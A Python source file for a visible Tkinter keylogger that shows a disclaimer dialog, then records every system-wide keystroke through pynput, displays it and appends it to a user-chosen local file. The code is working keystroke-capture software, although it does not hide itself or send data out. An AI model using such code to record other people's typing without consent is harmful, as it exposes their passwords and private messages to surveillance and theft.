# This Code written By Lokesh(HackResist)
import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""
        self.is_fullscreen = False  # Track the fullscreen state

        self.root = tk.Tk()
        self.root.withdraw()  # Hide the main window initially

        if not self.show_terms_and_conditions():
            self.root.destroy()  # Close the app if terms are not accepted
            return

        self.setup_main_window()
        self.root.deiconify()  # Show the main window

    def show_terms_and_conditions(self) -> bool:
        terms_window = tk.Toplevel(self.root)
        terms_window.title("Terms and Conditions")
        terms_window.geometry("400x300")

        terms_text = ("Please read the following terms and conditions before using this software.\n\n"
                      "1. You agree not to use this software for any illegal activities.\n"
                      "2. You understand that the software logs keystrokes and should be used responsibly.\n"
                      "3. The developer is not responsible for any misuse of this software.\n"
                      "4. By using this software, you agree to these terms.\n")
        
        tk.Label(terms_window, text=terms_text, wraplength=380, justify="left").pack(pady=10, padx=10)

        accept_button = tk.Button(terms_window, text="yes", command=lambda: self.CONTINUE_terms(terms_window), bg="#4caf50", fg="white")
        accept_button.pack(side=tk.LEFT, padx=10, pady=10)

        reject_button = tk.Button(terms_window, text="NO", command=lambda: self.EXIT_terms(terms_window), bg="#f44336", fg="white")
        reject_button.pack(side=tk.RIGHT, padx=10, pady=10)

        # Override the window close button behavior
        terms_window.protocol("WM_DELETE_WINDOW", lambda: self.EXIT_terms(terms_window))

        self.root.wait_window(terms_window)
        return self.terms_accepted

    def CONTINUE_terms(self, terms_window):
        self.terms_accepted = True
        terms_window.destroy()

    def EXIT_terms(self, terms_window):
        response = messagebox.askyesno("Confirm Exit", "Are you sure you want to exit? You must accept the terms to use the application.")
        if response:
            self.terms_accepted = False
            self.root.destroy()
            terms_window.destroy()

    def setup_main_window(self):
        self.root.title("Keylogger")
        self.root.geometry("800x600")  # Set a default window size
        self.root.config(bg="#2b2b2b")

        self.textbox = tk.Text(self.root, wrap="word", bg="#1e1e1e", fg="white", insertbackground="white")
        self.textbox.pack(fill="both", expand=True, padx=10, pady=10)

        self.status_label = tk.Label(self.root, text="Logging Stopped", fg="red", bg="#2b2b2b", font=("Arial", 12))
        self.status_label.pack(pady=5)

        button_frame = tk.Frame(self.root, bg="#2b2b2b")
        button_frame.pack(pady=10)

        self.start_button = tk.Button(button_frame, text="Start Logging", command=self.start_logging, bg="#4caf50", fg="white", font=("Arial", 12), width=15)
        self.start_button.grid(row=0, column=0, padx=5, pady=5)

        self.stop_button = tk.Button(button_frame, text="Stop Logging", command=self.stop_logging, bg="#f44336", fg="white", font=("Arial", 12), width=15, state="disabled")
        self.stop_button.grid(row=0, column=1, padx=5, pady=5)

        self.clear_button = tk.Button(button_frame, text="Clear Logs", command=self.clear_logs, bg="#ff9800", fg="white", font=("Arial", 12), width=15)
        self.clear_button.grid(row=1, column=0, padx=5, pady=5)

        self.save_button = tk.Button(button_frame, text="Choose File", command=self.choose_file, bg="#03a9f4", fg="white", font=("Arial", 12), width=15)
        self.save_button.grid(row=1, column=1, padx=5, pady=5)

        self.fullscreen_button = tk.Button(button_frame, text="Toggle Full-Screen", command=self.toggle_fullscreen, bg="#9c27b0", fg="white", font=("Arial", 12), width=15)
        self.fullscreen_button.grid(row=2, columnspan=2, padx=5, pady=5)

        # Bind Escape key to exit full-screen mode
        self.root.bind("<Escape>", self.exit_fullscreen)

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Automatically scroll down
        if self.filename:
            with open(self.filename, 'a') as logs:
                logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def toggle_fullscreen(self):
        self.is_fullscreen = not self.is_fullscreen
        self.root.attributes('-fullscreen', self.is_fullscreen)

    def exit_fullscreen(self, event=None):
        if self.is_fullscreen:
            self.is_fullscreen = False
            self.root.attributes('-fullscreen', False)

    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
